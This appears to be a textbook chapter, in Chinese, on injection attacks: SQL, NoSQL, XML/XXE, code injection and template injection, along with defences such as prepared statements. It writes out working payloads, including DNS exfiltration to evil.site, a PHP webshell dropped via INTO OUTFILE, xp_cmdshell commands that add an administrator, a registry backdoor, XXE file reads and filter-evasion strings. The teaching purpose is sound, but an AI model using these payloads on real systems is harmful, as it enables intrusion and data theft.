# 第十章
# 注入攻击
注入攻击是Web安全领域中一种最为常见的攻击方式。注入攻击的本质，是用户输入的数据当作代码执行，或者用于生成其他语义的内容，XSS的本质上也是针对HTML注入攻击。
有两个关键条件：

+ 用户能够控制输入
+ 原本执行的代码拼接了用户输入的数据  
## SQL注入
```
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM User WHERE username='$username' AND password='$password';";
```
这是一个用户登录场景，变量\$username和\$passwrod的值由用户提交。在正常情况下，假如用户输入username=admin&password=123，那么SQL语句会执行：
`SELECT * FROM User WHERE username='admin' AND pasword='123';`
如果用户输入的username中包含单引号，并含有其他具有SQL语句的内容，如：
`admin'-- `
那么，实际执行的SQL语句为：
`SELECT * FROM User WHERE username = 'admin -- ' AND password='123';`
其中，"-- "在SQL语法中表示单行注释，这一行后面的所有数据都会被忽略。
此例中，注入攻击的两个条件：
用户能够控制变量username
原本要执行的代码拼接了用户的输入：
`$sql = "SELECT * FROM User WHERE username='$username' AND password='$password';";`
拼接过程很重要，正是它导致了代码的注入。
### Union注入
在SQL注入中，使用联合查询还可以获取到其他表的数据。比如原本的查询逻辑是根据id查询图书信息：
`SELECT name, author FROM Books WHERE id=123;`
攻击者提交的id参数为：
`id=123 UNION SELECT username, password FROM Users`
那么实际执行的SQL语句如下：
`SELECT name, author FROM Books WHERE id=123 UNION SELECT username, password FROM Users;`
### 堆叠注入
在一些场景中，应用程序支持一次执行多条SQL语句，称为堆叠查询，如果存在注入漏洞则是堆叠注入漏洞。如：
`id =123;DROP TABLE Users;`
在Union注入中能使用的SQL语句类型是受限的，如果存在堆叠注入就能执行更多SQL语句。
堆叠注入并不是在所有环境下都可以使用，它与应用程序使用的数据库有关系，而且也受Web开发语言和数据库中间件的限制，比如MySQL本身是支持堆叠查询的，但是在PHP中最常用的mysql_query函数却不支持堆叠查询
### 报错注入
在SQL注入的过程中，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利。比如，攻击者在参数中输入一个单引号`'`，导致执行查询语句时发生语法错误，服务器返回该错误信息。
攻击者就能从错误信息中知道，服务器用的时MySQL数据库，查询语句出错的原因极有可能时单引号没有转义。
另外，部分数据库函数执行出错时会将参数内容添加到错误信息中，如UpdateXML、ExtractValue等函数第二个参数必须是XPath格式，当格式非法时，错误信息中就会包含参数的内容，这样就可以将攻击者需要获取的信息从错误信息中显示出来，如：
`id=1' and ExtractValue(1,concat(0x7e,database())) -- `
## 盲注
现代web应用在默认情况下大部分不会回显错误信息，所以攻击者需要使用"盲注"(Blind SQL Injection)技巧来探测其是否存在SQL注入漏洞。
所谓"盲注"，就是在服务器没有错误信息回显时完成注入攻击。
### 布尔型盲注
最常见的盲注验证方法是，构造简单的条件语句，根据返回页面是否变化，来判断SQL语句是否被执行。如：
`http://example.com/item.php?id=2`
执行的SQL语句为：
`SELECT title, description, body FROM items WHERE id =2`
构造如下语句：
`http://example.com/item.php?id=2 AND 1=2`
实际执行的SQL语句就会变成：
`SELECT title, description, body  FROM items WHERE id =2 AND 1=2`
因为该语句为假，服务器将不会返回结果给用户。
攻击者无法看到完整的SQL语句，为了进一步确认是否存在注入漏洞，攻击者还必须验证这个过程。因为应用程序内部的处理逻辑或安全过滤功能，攻击者构造的异常请求也可能会导致页面无法正常返回，因此会进一步测试，构造如下请求：
`http://example.com/item.php?id=2 AND 1=1`
当攻击者构造条件"AND 1=1"，如果页面正常返回，则说明SQL语句执行成功，则存在SQL注入漏洞。攻击者也可以通过构造"OR 1=1"来尝试。
该攻击过程中，服务端虽然关闭了错误回显，但是攻击者能通过对比返回页面的差异，来判断是否存在SQL注入
在布尔型盲注中，存在注入漏洞不一定是体现在查询结果的不一致上，有时候在HTTP响应的其他地方也会体现细微差异，如DOM节点差异，可能需要多次尝试来验证。在自动化扫描器中，通常会通过响应内容的长度差异来判断是否存在注入漏洞
### 延时盲注
并不是所有的应用场景的查询结果都会影响显示页面。如果查询结果仅用于应用程序的内部处理逻辑，并不影响页面的输出内容，那么布尔型盲注就失效了，因此需要其他手段。
在web应用中，查询数据库通常都是同步操作，即查询数据库的事件长短会影响请求的响应时间。在数据库中，有不少函数都可以通过参数控制其执行时常。在MySQL中，有一个BENCHMARK()函数，用于测试函数性能，它有两个参数：
`BENCHMARK(count,expr)`
该函数的执行结果，是将表达是expr执行count次。如：
`SELECT BENCHMARK(5000000,MD5(123));`
通过执行时长来判断注入语句是否执行成功。
上述案例中，构造如下参数：
`123 OR BECHMARK(5000000,MD5(123));-- `
服务端响应时间更长，则说明存在SQL注入漏洞。
延时盲注的具体方式与数据库类型有关：

|   数据库    |                      延时方法                       |
| ---------- | -------------------------------------------------- |
| MySQL      | BENCHMARK(1000000,md5(1))、SLEEP(5)、GET_LOCK(1,5) |
| PostgreSQL | pg_sleep(5)、generate_series(1,1000000)            |
| SQL Sever  | WAITFOR DELAY'0:0:5'                               |
此外，还有一些通用的方法可以实现延时效果 。让服务端查询一个大表，相对简单的方式是让数据库对一个表执行笛卡尔积操作。但是，会消耗服务器资源影响正常业务。
### 带外数据注入
所谓的带外数据 (Out-of-Band)，是值执行一项操作时通过额外的信道向外发送的数据，可以用来判断目标应用是否存在SQL注入漏洞。攻击者更多的时候是利用带外数据来向外传送特定内容。
如果web应用中的查询数据库操作是异步进行的，对它的注入操作不会直接反应在HTTP响应中，布尔型盲注和延时盲注都不可用了。通过带外数据，我们可以构造特定的SQL语句让目标数据库通过网络向外发送数据，这种注入攻击就是带外数据注入。
例如在使用SQL Server的应用中，如果参数id存在SQL注入漏洞，对于如下语句：
`http://example.com/item.aspx?id=1;EXEC master..xp_dirtree'\\5d41402abc4b2a76.evil.site\' --%20`
第二条语句会执行SQL Server的xp_dirtree存储过程，其功能是列出网络驱动器 \\5d41402abc4b2a76.evil.site\下的所有目录，不一定存在，但是在执行时，数据库会向攻击者的域名服务器发起一次DNS查询，这样攻击者通过监控DNS日志就能知道注入的SQL语句是否执行成功。
其他数据库中也会有类似的网络函数用于向外发送数据。如mysql中可以使用`LOAD_FILE`函数加载网络驱动器上的文件：
`SELECT LOAD_FILE('\\\\5d41402abc4b2a76.evil.site\1.txt')`
同样该函数也会发起一次DNS查询。该用法依赖与mysql中国呢的secure_file_priv的配置变量，它用于控制mysql允许访问的文件路径，旧版mysql该选项的值默认为空，即不做任何限制，很容易成功，新版mysql中，默认值是NULL，不允许访问目录。
在Oracle数据库中，可以使用UTL_INADDR.GET_HOST_ADDRESS、UTL_HTTP.REQUEST等函数发起请求。
## 二次注入
之前的案例都是web应用将用户的输入数据直接用于拼接SQL语句导致的。有时候，开发人员对外部数据做了严格的过滤，或采用完善的SQL注入防御方案，但是在将应用程序内部数据拼接到SQL语句中时，错误地认为内部数据都是可信的，未采取相应的安全措施。
当用户提交恶意数据被存入数据库后，应用程序再把它读取出来用于生成新的SQL语句时，如果没有相应的安全措施，还是有可能发生SQL注入，这种注入叫做二次SQL注入，也叫存储型SQL注入
## SQL注入技巧
SQL注入是基于数据库的一种攻击。不同的数据库有着不同的功能、语法和函数，因此针对不同的数据库，SQL注入的技巧也有所不同。
### 常见攻击技巧
手工注入非常繁琐，通常使用sqlmap等自动化工具。
攻击者在实施注入攻击的过程中，常常会用到一些读/写文件的技巧，比如mysql中，就可以通过`LOAD_FILE()`读取系统文件
`id=1 union select 1,1,LOAD_FILE('etc/passwd')`
当然，这要求当前数据库进程有读/写系统响应文件或目录的权限，数据库账号被授予了FILE权限，并且数据库配置中的secure_file_priv值为空
通过`INTO OUTFILE`可以写入文件，该技巧经常被用于导出一个webshell到web目录，进行远程连接。执行这个语句需要提前知道Web目录路径，可以使用前面读取文件的方式，尝试读取web服务器的默认配置文件来获取web目录.
`id =1 union select '<?php eval($_GET['c']);?>' into outfile '/var/www/shell.php'`
除了使用INTO OUTFILE，也可以使用`INTO DUMPFILE`。二者区别是后者适用于二进制文件，所以在有权限的场景中，可以往指定位置写入可执行文件或动态链接库。很多时候受URL长度限制，需要将文件内容分批次写入一个表中，然后再导出到指定位置：
```
CREATE TABLE tb1(data longblob);
INSERT INTO tb1(data) VAlUES(0x4d5a90...0000);
UPDATE tb1 SET data=CONCAT(data,0xaa27...000);
[...];
SELECT data FROM tb1 INTO DUMPFILE 'path';
```
如果想要获取数据库中的数据，但是应用中的网页不能回显，那么使用外带数据可以方便的将数据发送到指定的目标，如：
```
id=1 union select load_file(concat('\\\\',version(),'.evil.site\\1.txt'))
id=1 union select load_file(concat(0x5c5c5c5c,version(),0x2e....))
```
在网络安全产品中，通常会过滤特定的SQL关键字，以拦截SQL注入攻击。我们可以通过注释符或换行符绕过简单的关键词过滤。比如，UNION SELECT被过滤了，可以尝试如下方法：
```
id=1 union/**/select password from User
id=1 union-- hello%0D%0Aselect password from User
```
它们都是通过注释符将UNION和SELECT字符分隔开，使简单的正则表达式无法匹配。
一些智能安全产品会尝试对SQL语句做语法分析，去掉其中的注释符。但是，MySQL还存在版本条件注释，比如下面的语句在mysql版本大于4.04.04时，注释符内部的值还是有效的：
`id=1 union/*!40404 select */ password from User`
如果安全产品只是简单地将注释内容去掉，就会丢掉SQL注入重要的攻击特征，导致无法命中安全检测规则，而后端的mysql中条件注释不成立，注释中的内容就会被拼接到SQL语句中，形成完整的攻击语句，就绕过了安全产品，实现了攻击。
处理注释是一件麻烦的事情，由于安全产品接收到的HTTP请求中的数据只是SQL语句片段，无法判断变量在SQL语句中是否处于引号的包围中，所以对单引号的处理会存在多种不同的结果，如：
`id=1 union-- '%0D%0Aselect password from User`
假设id变量在SQL语句中是数字，而解析引擎误认为id是字符串，单引号是用于闭合字符串的，它就不会把"-- "解析成注释，使得在拼接后的语句中，单引号被注释掉了，从而绕过了检测。 (注释符仅注释掉了单引号)
如果id变量在SQL语句中是由单引号包围的字符串，而解析引擎误认为它是数字，从而认为注释符生效，将"union"字符串当作注释符删除掉再检测，也将导致漏报。
`id=1 -- ' union%0D%0A select password from User--%20`
不仅仅是在查询条件中，在SQL语句中的ORDER BY或LIMIT参数也可能发生注入。比如，Web应用支持通过URL的order参数来控制查询结果的排序，通过如下盲注方式验证是否存在注入：
`items.php?order=sleep(2)`
还可以通过注入猜解数据库中的内容。比如，下面的order参数就可以判断mysql的大版本号是否为8
`items.php?order=if(ascii(substr(version(),1,1))=56,0,sleep(2))`
在一些少见的场景中，SELECT语句中查询的字段是由外部参数控制的，如果查询内容会展示在网页中，我们可以通过"AS别名"的方式获取数据库中的其他信息，如：
`show.php?filed=(select passwd from user) as title`
如果不显示内容在网页中，则需要通过延时盲注的方式来获取数据。
### 命令执行
在mysql中，除了通过导出Webshell间接地执行命令外，还可以利用用户自定义函数，即UDF(User-Defined Functions)，来执行命令。mysql支持从本地文件中载入一个动态链接库作为自定义函数。使用如下语法可以创建UDF：
`CREATE FUNCTION function_name RETUNRS data_type SONAME shared_library`
在允许堆叠执行的SQL注入漏洞中，或者通过SQL注入导出webshell来执行任意SQL语句时，攻击者可以先使用SELECT ... INTO DUMPFILE语句写入UDF动态链接库，再通过CREATE FUNCTION语句创建自定义函数，从而执行UDF中的代码。攻击者可以根据自己的需要将功能编译到动态链接库中，比如执行命令、反弹shell等等。lib_mysqludf_sys是一个被攻击者广泛使用的UDF，它集成了简单的执行命令功能，攻击方式如下：
```
show variables like 'plugin%';    //查找动态库路径

select 0x4d5a900030...000000 into  dumpflie 'C:\\Program Files\\mysql-8.0.27-winx64\\plugin\\lib_mysqludf_sys.dll';    //将编译好的二进制文件写入文件中

create function sys_eval returns string soname 'lib_mysqluudf_sys.dll';     //创建自定义函数

select cast(sys_eval('ver')) as char(1024)    //调用自定义函数
```
必要条件：

+ mysql的secure_file_priv配置为空，或者其值正好是plugin目录
+ mysql进程要有写入plugin目录的权限
在拥有写权限的情况下，攻击者可以将需要执行的VBS脚本写入`%SystemRoot%\System32\Wbem\MOF\nullevt.mof`文件，系统将周期性地执行这个文件，从而实现命令执行。也可以写入系统开机自启动目录。
PostgreSQL同样支持类似UDF来执行任意代码
SQL Server中，可以直接使用存储过程过xp_cmdshell来执行系统命令
在Oracle数据库中，如果服务器同时还有Java环境，那么也可能造成命令执行。Oracle支持使用Java来编写存储过程 ，利用该特性，攻击者可以执行Java代码，从而实现命令执行。
在SUS.DBMS_EXPORT_EXTESION扩展包中，GET_DOMAIN_INDEX_TABLES函数可注入Java代码，受影响的Oracle版本比较老。
一般来说，在数据库中要执行系统命令，必须具有较高的权限。开发者在建立数据库账户时应遵循"最小权限原则"，尽量避免给Web应用授予数据库管理员权限。
### 攻击存储过程
存储过程为数据库提供了强大的功能，它与UDF很像，但必须使用CALL或者EXECUTE来执行。MS SQL Server和Oracle中都有大量内置的存储过程。在注入攻击中，存储过程为攻击者提供了很大便利。
MS SQL Server中的存储过程xp_cmdshell经常被黑客用来执行系统命令：
`EXEC master.dbo.xp_cmdshell 'cmd'.exe dir c:'
EXEC master.dbo.xp_cmdshell 'ping'`
在 SQL Server 2000中，xp_cmdshell默认是开启的，在2005及以后版本默认关闭。如果当前数据库用户拥有sysadmin权限，则可以使用sp_configure重新开启xp_cmdshell：
```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC spconfigure 'xp_cmdshell',1
RECONFIGURE
```
使用xp_cmdshell执行系统命令：
```
EXEC master..xp_cmdshell 'net user testuser passw0rd /add'
ExEC master..xp_cmdshell 'net localgroup administrators testuser add'
```
除了 xp_cmdshell外，还有一些存储过程对攻击过程也是有帮助的，比如，xp_regwrite可以写注册表：
```
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windwos NT\CurrentVersion\Image FileExecution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\taskmgr.exe'
```
上述操作替换了Windows黏滞键，实现了提权。
除了被利用来直接实施攻击，存储过程本身也可能存在注入漏洞。PL/SQL的例子：
```
procedure get_item(
    itm_cv IN OUT ItmCurTyp,
    usr in varchar2,
    itm in varchar2)
is
    open itm_cv for 'SELECT * FROM items WHERE'||'owner= '''||usr||'AND itemname='''||itm||'''';
end get_item;
```
在这个存储过程中，变量usr和itm都是由外部传入的且未经过任何处理，它们将直接造成SQL注入漏洞。在Oracle中，由于内置的存储过程非常多，很多存储过程都可能存在SQL注入漏洞，需特别注意。
### 编码问题(宽字节注入)
有时候，不同的字符编码可能导致安全问题。在应用中，，开发者为了安全，经常会使用转义字符`\`来转义这些字符。如果web应用层和数据库层使用了不同的字符集，可能会产生一些意想不到的漏洞。如果msyql使用的是GBK编码，会将0xbf5c理解成一个字符。
进入数据库之前，在web开发语言中如果没有考虑双字节字符的问题，双字节字符会被认为是两个字符。如在PHP中使用addslashes()函数，或开启magic_quotes_gpc时，会在特殊字符前增加一个转义字符"\"。addslashes仅会简单地转义四个字符
如PHP代码中设置数据库连接的字符集为GBK，并使用addslashes()函数转义name参数：
```
$conn->set_charset('GBK');
$name=addslashes($_GET['name']);
$sql="SELECT * FROM tb1 WHERE name='$name';";
$result= $conn->query($sql);
```
攻击者输入：
`name=%bf527 or 1=1--%20`
经过addslashes()函数，转义后0xbf27就会 变成0xbf5c27(\的ASCII编码为0x5c ),0xbf5c在GBK中是一个汉字。
语句就会变成：
`SELECT * FROM tb1 WHERE name='缞' or 1=1-- `
要解决该问题需要统一Web应用和数据库所使用的字符集，避免各个层级对字符的理解存在差异。例如，将addslashes()函数替换成real_escape_string函数，就能避免该问题，该函数会根据数据库所使用的字符集进行正确的转义。
基于字符集的攻击，在任何会解析数据的地方都可能存在。
不规范的编码也可能导致SQL注入漏洞。
```
$name = addslashes($_GET['name']);
$name=urldecode($name);
$sql="SELECT * FROM tb1 WHERE name='$name';";
```
当攻击者提交如下参数时，就会发生SQL注入：
`name=1%2527 or 1=1--%20`
%2527通过两次URL编码，使得addslash函数将%25识别成%，而后续%27就变成了 ' 绕过了安全检测
多次编码对于安全产品的攻击检测也是挑战，很多安全产品只会递归的解码，而web应用中只进行了一次解码，通过差异就会导致漏洞。
`id=1%2523 or 1=1`
经过两次解码后就会变成id=1#or 1=1 可能会被安全产品识别为安全。web应用只做了一层解码id=1%23 or 1=1是一个合法语句，从而产生SQL注入漏洞。
### SQL Column Traction
如果mysql配置选项中，sql_mode没有开启STRICT_ALL_TABLES，mysql对于用户插入超长值只会提示warning，这种情况可能会因字符串被"截断"而产生安全问题。
`select * fromm truncated_test
insert into truncaed_test('username','password') vlaues('admin      ','new_passwd');
`
虽然被截断的数据中包含多个空格，但是还是能匹配admin，因此就能用该账户来当作管理员登录。但是只用STRICT_ALL_TABLES关闭才行，默认是开启的。
## 防御SQL注入
很多场景中的SQL注入是由于用户提交的参数中包含单引号，将SQL语句中的字符串提前闭合而导致的，很容易使开发者走入一个误区，认为在拼接SQL语句时对变量做转义就可以防御SQL注入。其实不行：
```
$id = $conn->real_escape_string($_GET['id']);
$sql = "SELECT * FROM tb1 WHERE id=$id;";
```
当攻击者构造如下代码时：
`id=123 union select password from User`
SQL注入还是成功了，应为real_escape_string仅会转义NUL( ASCII码为0 )、\n、\r、\ 、'、" 和Control-Z(ASCII码为26)
像通过黑名单过滤关键字也会存在问题：
`id=123/**/union/**/select/**/password/**/from/**/User`
仅需要将空格改为注释就可绕过(黑名单匹配不到，但是注释符会被代码识别)，因此需要采用更标准的方法来防御
### 使用预编译语句
如果能将SQL语句的结构固定下来，仅填充可变的数据部分，就可以避免SQL注入。这个预先定义的SQL语句叫预编译语句(Prepared Statement)，这种查询方法也叫做参数化查询(Prepared Query)，例如Java中使用预编译语句操作数据库：
```
String sql = "select * from User where name=? and page=?";
PreparedStatement preparedStatement = connection.preparedStatement(sql);
preparedStatement.setString(1,"wang"); //进行参数绑定
preparedStatement.setLong(2,60);
ResultSet result = preparedStatement.executeQuery();
```
使用预编译的SQL语句 ，其语义不会发生改变，可以将其理解为SQL模板。在语句中，变量使用？作为占位符，攻击者无法改变SQL语句的结构。
PHP中使用预编译语句：
```
//prepare
$stmt = $mysqli->prepare("INSERT INTO test(id,label) VAULES(?,?)");
//bind and execute
$id = 1;
$label = 'PHP';
$stmt->bind_param("is",$id,$label);//"is" means that $id is bound as an integer and $label as a string
//execute
$stmt->execute();
```
SQL语句中仅数据部分可以使用参数绑定，而表名、列名本身属于SQL语句结构的一部分，它们是不能使用参数绑定的。而在应用中根据用户提交的列名参数来排序是常见的功能，所以ORDER BY语句很容易产生SQL注入，需特别注意，可以使用参数校验的方式来保证其安全。
预编译语句不仅可以防止SQL注入，还能提升数据库性能，因为SQL语句的结构固定，数据库将它编译后会缓存起来，下次查询时无须再编译，从而获得更好的性能。
一般来数，防御SQL注入的最佳方式，就是使用预编译语句，绑定参数查询。但是不正确地使用预编译语句还是会造成安全问题，如果把外部输入的变量用于生成预编译语句，相当于SQL语句的结构受外部输入控制，还是会存在SQL注入。
### 使用存储过程
使用安全的存储过程也可以对抗SQL注入。使用存储过程的效果和使用预编译语句类似，其区别就是存储过程会将SQL语句定义在数据库中，在使用时只需将参数传给数据库就能执行操作，有点像远程函数调用。存储过程应该避免在存储过程中使用动态拼接SQL语句。无法避免则应该严格过滤输入，或者编码用户输入。
例如使用Java调用存储过程，其中sp_getAccountBalance是预定义的存储过程：
```
String cuntname=request.getParameter("customerName");
try{
    CallabesStatement cs = connection.prepareCall("{
     call sp_getAccountBalance(?)}");
     cs.setString(1,custname);
     ResultSet results=cs.executeQuery();
     //...result set handling
} catch (SQLException se){
    //...logging and error handling
}
```
使用存储过程可以防止SQL，但一般应用不会为了防止SQL注入就使用存储过程，通常用于处理复杂的数据库操作，对于简单的数据库查询，使用预编译就可以。
### 参数校验
大部分情况下，使用预编译语句或存储过程就可以解决SQL注入问题，但有少数场景无法使用预编译语句，只能通过输入过滤和编码进行防御。
检查输入数据的数据类型，可以很大程度上对抗SQL注入。比如，下面这段代码限制了输入的数据类型只能为integer，或者对输入变量强制类型转换。
```
<?php
settype($offset,'integer');
//$offset=intval($offset);
$query = "SELECT id,name FROM products ORDER BY name LIMIT 20 OFFSET $offset;";
$query=sprintf("SELECT id, name FROM products ORDER BY name LIMIT 20 OFFSET %d;",$offset);
?>
```
对其他对数据格式做类型检查也是有益的，比如严格按照邮箱的格式输入邮箱信息，严格按照时间和日期的格式输入时间和日期等，能避免用户输入的数据造成破坏。对用户可控的参数使用白名单，以及严格过滤。
### 使用安全函数
在有些场景中可能使用简单的SQL语句拼接会更方便，比如Where条件的个数不固定时。一般来说，各种web编程语言都实现了一些编码函数，可以帮助对抗SQL注入，但是可能会被绕过，需要小心使用。同时注意字符集和编码，不要使用addslashes要使用mysqli_real_escape_string函数，使用统一的字符编码。
一些web开发框架使用了数据访问对象(Database Access Objects，DAO)来操作数据库，开发者可以使用面向对象的API来操作数据，底层会自动构造相应的SQL语句来访问数据库，即使查询条件不固定，也能程序化地构造SQL语句，如Yii框架(PHP)中的Query  Builder：
```
$row = (new \yii\db\Query())
    ->select(['id','email'])
    ->from(''user')
    ->where('[last_name]'=>'Smith')
    ->limit(10)
    ->all();
```
开发者无须手动做转义和拼接即可动态生成SQL语句。在动态构造语句的场景中推荐使用。但是该做法是在web应用层实现的，其安全性依赖于框架本身。预编译语句是在数据库层实现的，安全性通常会更高。
这种高度 封装的SQL操作会有更大的概率产生“批量赋值(Mass Assignment)漏洞”，例如：
`/update_info.php?info[name]=LaoWang&info[age]=60`
服务端执行更新数据库user表的操作可能会这么写(义Yii框架为例)：
```
$info = $_GET['info'];
Yii::$app->da.>createCommand()->update('user',$nfo,['id'=>$current_uid])->execute();
```
如果攻击者在更新用户信息时，往参数中插入了一个字段role，由于需要更新的数据是通过数组批量传过去的，将导致user表中的role列也被更新，如：
`/update_info.php?info[name]=LaoWang&info[age]=60&info[role]=admin`
这样，用户就将自己的角色(role)更新成管理员，这种攻击叫"批量攻击"，也称为"覆盖属性"，本质上也是一种注入攻击。除了提交表单的场景中，其他场景，如使用JSON、XML文件提交数据，也可能产生赋值漏洞。
从数据库自身的角度来说，应遵循最小权限原则。
## 其他注入攻击
除了SQL注入攻击还有其他注入攻击，都类似，都是应用程序违背了"数据与代码分离"原则而导致的。
### NoSQL注入
现代web应用中大量应用NoSQL数据机库应对大规模高并发的场景，NoSQL是指非关系型数据库。每种NoSQL都有自己的查询语言，但也会存在注入漏洞。以MongoDB为例，如下Node.js代码用于处理用户登录请求：
```
let query={
    username:req.body.username,
    password:req.body.password
}
User.find(query,function(err,user){
    if(err){
        //handle error
    }else{
        if(user.length>=1){
            res.json({role:user[0].role,
            username:user[0].username,
            msg:"Correct!"});
        }
    }
});
```
正常情况下，用户提交的JSON对象用于登录，用户名和密码都是字符串变量：
`{"username":"myaccount","password":"passwrod"}`
但是在MongoDB中，查询条件支持不同的查询操作符，如$ne表示"不等于"。攻击者构造如下请求：
`{"username":"admin","password":{"$ne":1}}`
其中password不是简单的字符串变量，而是查询条件，只要admin账户的密码不等于1，就能匹配成功，攻击者可以登录任意账户。
即使以表单的形式提交请求，也可以注入这种查询条件，如POST包包含如下内容：
`username=admin&password[$ne]=1`
在PHP中，password变量在程序内部的值是array("$ne"=>1)，也能实现查询条件注入。
MongoDB支持使用$where查询操作符，如果MongoDB的配置中JavascriptEnabled为true，那么它还支持调用一个JavaScript 函数来匹配数据，如：
```
db.collection.find({$where:function(){return (this.name == $userData)}});
```
如果变量$userData由外部输入控制，就存在代码注入的可能，攻击者可以注入任意JavaScript代码，如：
```
db.collection.find({$where:function(){return (this.name == 'a';sleep(5000))}});
```
由于各种NoSQL数据库都在快速发展中，且各种特性不一致 ，目前还没有标准化的方案防御。
### XML注入
XML是一种常用的数据交换格式，与HTML一样也存在注入攻击，如以下Java代码生成一个xml文件：
```
final String GUSETROLE = "guest_role";
...
//userdata是准备保存的XML数据，接收了name和email两个用户提交的数据
String userdata = "<USER role="guest_role"><name>"+request.getParameter("name")+"</name><email>"+request.getParameter("email")+"</email></USER>";
//保存XML数据
userDao.save(userdata); 
```
如果用户构造恶意代码就可能形成注入攻击：
```
user1@a.com</email></USER><USER role="admin_role"><name>test</name></email>user2@a.com
```
最终生成的XML文件就会包含两条USER记录：
```
<USER role="guest_role">
<name>user1</name>
<email>user1@a.com</email>
</USER>
<USER role="admin_role">
<name>test</name>
</email>user2@a.com</email>
</USER>
```
XML注入攻击也需要满足两个条件：用户能控制数据的输入，并且程序拼接了数据。需要对数据中的特殊符号进行转义
XML还支持使用CDATA区段来表示纯文本内容，使用方式如下：
`<code><![CDATA[if(a<b&&a<0){...}]]></code>`
CDATA区段<![CDATA[.....]]>其中包含的字符串都会被解析器当作文本，文本中不能包含]]>。
#### XML外部实体注入(XXE)
更常见更危险的针对XML的攻击是外部实体(XML External Entity，XXE)注入。在XML标准中有几个预定义的实体来表示特殊字符如：`&gt;`和`&lt;`表示<和>符号，此外XML允许自定义实体，在XML的文档类型定义(Document Type Definition，即DOCTYPE节点)中，我们可以使用ENTITY来定义自己的实体，如：
```
<?xml version="1.0"?>
 <!DOCTYPE foo[
    <!ENTITY test "hello world">
]>
<foo> &test;</foo>
```
定义了test实体的内容是"hello world"，并且这个实体可以在下面的XML元素中被引用。此时如下Java代码用dom4j(处理XML文档的Java库)去解析这个XML文件，得到foo节点的值是"hello world"，这是XML自定义实体的常规用法，这种实体也叫做内部实体。
```
SAXReader saxReader = new SAXReader();
Document document = sanxReader.read("test.xml");
Element root = document.getRootElement();
system.out.println(root.getText());
```
但是XML还支持外部实体，使用SYSTEM关键字可以将外部资源作为实体内容，如：
```
<?xml version="1.0"?>
<!DOCTYPE foo[
    <!ENTITY test SYSTEM "file:///etc/passwd">
]>
<foo>&test;</foo>
```
再用Java代码去解析，将输出/etc/passwd文件的内容。这种在XML内容中嵌入外部实体的攻击叫外部实体注入。
如果web应用接收用户提交的XML内容，并且在解析后将其中部分内容返回给用户，攻击者将可以通过外部实体注入实现任意文件读取，从而获取服务器上的敏感数据。
除了使用file://协议读取本地文件，多数XML库还支持网络协议读取其他服务器的资源。攻击者可以用这种方式实现服务端伪造攻击(SSRF)，向内部服务器发起攻击，或读取内部服务器上的资源，如：
```
<?xml version="1.0"?>
<!DOCTYPE foo[
    <!ENTITY test SYSTEM "http://10.100.1.152/1.txt">
]>
<foo>&test;</foo>
```
除了读取文件，在特殊情况下，服务端还可能支持其他危险协议，可被用来执行更危险的操作。在PHP中安装expect模块后，就支持使用expect://协议来执行系统命令，如：expect://ifconfig
此外，实体也支持嵌套引用，即一个实体可以引用另一个实体。通过构造多级实体引用，可以让实体展开后变成超长的内容，以实现拒绝服务攻击：
```
<?xml version="1.0"?>
<!DOCTYPE foo[
    <!ENTITY x0 "BOOM!">
    <!ENTITY x1 "&x0;&x0;">
    <!ENTITY x2 "&x1;&x1">
    ...
    <!ENTITY boom "&x99;&99;">
]>
<foo>&boom;</foo>
```
引用外部实体是XML标准的定义，所以很多XML库都存在这种漏洞，随着这些库的升级，很多库都去掉了引用外部实体的特性，或者默认不启用。
Java中最常用的XML解析库dom4j，当前最新版本(2.1.3)还是默认启用了外部实体，需手动关闭：
```
saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
saxReader.setFeature("http://apache.org/xml/features/external-general-entities",false);
saxReader.setFeature("http://apache.org/xml/features/external-parameter-entities",false);
```
在web应用中，接收客户端提交的XML内容是非常常见的场景，很多标准协议也采用XML作为数据格式。
### 代码注入
代码注入在web应用中也叫远程代码执行，攻击者可以利用吃漏洞在服务器上执行任意代码，因此代码注入是最危险的漏洞之一。
#### 执行动态代码
代码注入的方式非常多样，常规的代码注入是由一些不安全的函数或者方法引起的。其中典型的做法就行动态构造代码并执行，比如使用eval()函数：
```
$myvar = "varname";
$x = $_GET['arg'];
eval("\$myvar=$x;");
```
攻击者可以通过如下Payload实施代码注入：
`/index.php?arg=1;phpinfo()`
php中还允许通过变量来实现动态函数调用，如：
```
$myfunc=$_GET['myfunc'];
$myfunc();
```
攻击者也能实现任意函数调用。存在代码注入漏洞的地方，与"后门"没有区别。
PHP中有很多的函数可用于动态运行代码，如eval()、assert()、preg_replace()、create_function()、call_user_func()、array_map()等等。
python中也有eval()函数，可将字符串当作代码来运行，使用不当时也会发生代码注入。
Java中也可以实施代码注入，表达式注入，如果使用脚本引擎，也可能产生代码注入漏洞。下面的Java代码使用了JavaScript执行引擎，并且将外部参数拼接到JavaScript中：
```
import javax.script.*;
public class Example1P{
    public static void main(String[] args){
        try{
            ScreiptEngineManager manager = new ScriptEngineManager();
            ScriptEngine engine = manager.getEngineByName("JavaScript");
            System.out.println(args[0]);
            engine.eval("print('"+args[0]+"')"); 
        }catch(Exception e){
            e.printStacktTrace();
        }
    }
}
```
攻击者构造如下参数内容：
`hallo');var fImport = new JavaImporter(java.io.File);with(fImport){var f = new File('new');f.createNewFile();}`
此外，JSP的动态include也能导致代码注入。严格来数，PHP、JSP的动态include(文件包含漏洞)导致的代码执行，都可以算作代码注入。
```
<% String pageToInclude=getDataFromUntrustedSource();%>
<jsp:include page="<%=pageToInclude%>"/>
```
#### 服务端模版注入(SSTI)
在web应用中，为了将HTML代码与应用逻辑代码分离，通常会使用HTML模板引擎来简化代码。例如，在PHP中原本输入变量要使用如下繁琐方式：
```
<?php echo $var;?>
<?php echo htmlspecialchars($var,ENT_QUOTES,'UTF-8');?>
```
而使用Twig模板引擎后，上面的HTML输出可以简化成：
```
{{var}}
{{var|escape}}
```
虽然模板引擎带来了方便，但是如果使用不当，除了产生XSS漏洞，还可能会在服务端产生代码漏洞，相应的攻击叫做服务端模板注入(Server Side Template Injection，SSTI)攻击。
服务端模板注入是将外部输入变量用于构造模板所导致的，例如：
`$output=$twig->render("hello".$_GET['name']);`
正常情况下将输出name参数的值。但是当name中包含模板自身的语法时，Twig模板引擎会将它解析成代码来执行，比如，name参数为如下值时：
`{{7*7}}`
